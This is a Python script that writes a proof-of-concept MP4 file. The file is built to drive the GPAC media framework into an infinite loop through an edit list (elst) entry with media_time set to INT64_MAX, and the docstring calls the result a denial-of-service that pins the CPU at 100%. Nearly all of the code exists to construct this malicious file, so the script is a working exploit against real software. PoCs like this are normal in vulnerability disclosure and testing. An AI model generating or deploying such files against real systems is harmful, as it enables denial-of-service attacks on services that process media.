#!/usr/bin/env python3
"""Generate PoC for GPAC Edit List (elst) infinite processing loop.

An elst box with media_time = INT64_MAX (0x7FFFFFFFFFFFFFFF) causes GPAC's
sample processing to enter an infinite loop, emitting hundreds of thousands
of identical packets per second. This is a denial-of-service condition that
consumes 100% CPU with no termination.
"""
import struct
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def write_box(box_type, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def write_fullbox(box_type, version=0, flags=0, payload=b""):
    vf = struct.pack(">I", (version << 24) | flags)
    return write_box(box_type, vf + payload)


def make_minimal_mp4(trak_extra=b""):
    ftyp = write_box(b"ftyp", b"isom" + struct.pack(">I", 0x200) + b"isom" + b"mp41")
    mdat = write_box(b"mdat", b"\x00" * 100)

    mdhd = write_fullbox(b"mdhd", payload=struct.pack(">IIIIH2x",
        0, 0, 90000, 90000, 0x55C4))
    hdlr = write_fullbox(b"hdlr", payload=(
        b"\x00\x00\x00\x00" + b"vide" + b"\x00" * 12 + b"VideoHandler\x00"))

    mp4v_box = write_box(b"mp4v",
        b"\x00" * 6 + struct.pack(">H", 1) + b"\x00" * 16 +
        struct.pack(">HH", 320, 240) +
        struct.pack(">II", 0x00480000, 0x00480000) +
        struct.pack(">I", 0) + struct.pack(">H", 1) + b"\x00" * 32 +
        struct.pack(">H", 0x0018) + struct.pack(">h", -1))
    stsd = write_fullbox(b"stsd", payload=struct.pack(">I", 1) + mp4v_box)
    stts = write_fullbox(b"stts", payload=struct.pack(">I I I", 1, 1, 90000))
    stsz = write_fullbox(b"stsz", payload=struct.pack(">II", 0, 1) + struct.pack(">I", 100))
    stco = write_fullbox(b"stco", payload=struct.pack(">II", 1, len(ftyp) + 8))
    stsc = write_fullbox(b"stsc", payload=struct.pack(">I III", 1, 1, 1, 1))
    stbl = write_box(b"stbl", stsd + stts + stsz + stco + stsc)

    url_box = write_fullbox(b"url ", flags=1)
    dref = write_fullbox(b"dref", payload=struct.pack(">I", 1) + url_box)
    dinf = write_box(b"dinf", dref)
    vmhd = write_fullbox(b"vmhd", flags=1, payload=struct.pack(">H HHH", 0, 0, 0, 0))
    minf = write_box(b"minf", vmhd + dinf + stbl)
    mdia = write_box(b"mdia", mdhd + hdlr + minf)

    tkhd = write_fullbox(b"tkhd", flags=3, payload=(
        struct.pack(">II", 0, 0) + struct.pack(">I", 1) + struct.pack(">I", 0) +
        struct.pack(">I", 90000) + b"\x00" * 8 + struct.pack(">hh", 0, 0) +
        struct.pack(">hH", 0, 0) +
        struct.pack(">9I", 0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000) +
        struct.pack(">II", 320 << 16, 240 << 16)))

    trak = write_box(b"trak", tkhd + mdia + trak_extra)

    mvhd = write_fullbox(b"mvhd", payload=(
        struct.pack(">II", 0, 0) + struct.pack(">I", 90000) + struct.pack(">I", 90000) +
        struct.pack(">I", 0x10000) + struct.pack(">H", 0x100) + b"\x00" * 10 +
        struct.pack(">9I", 0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000) +
        b"\x00" * 24 + struct.pack(">I", 2)))

    moov = write_box(b"moov", mvhd + trak)
    return ftyp + mdat + moov


def make_elst_overflow():
    elst = write_fullbox(b"elst", version=1, payload=(
        struct.pack(">I", 2) +  # entry_count
        # Entry 1: normal duration, media_time = INT64_MAX
        struct.pack(">qqi", 90000, 0x7FFFFFFFFFFFFFFF, 0x10000) +
        # Entry 2: media_time = -1 (empty edit)
        struct.pack(">qqi", 90000, -1, 0x10000)
    ))
    edts = write_box(b"edts", elst)
    return make_minimal_mp4(trak_extra=edts)


if __name__ == "__main__":
    out_path = os.path.join(OUT, "poc.mp4")
    data = make_elst_overflow()
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"Written {len(data)} bytes to {out_path}")
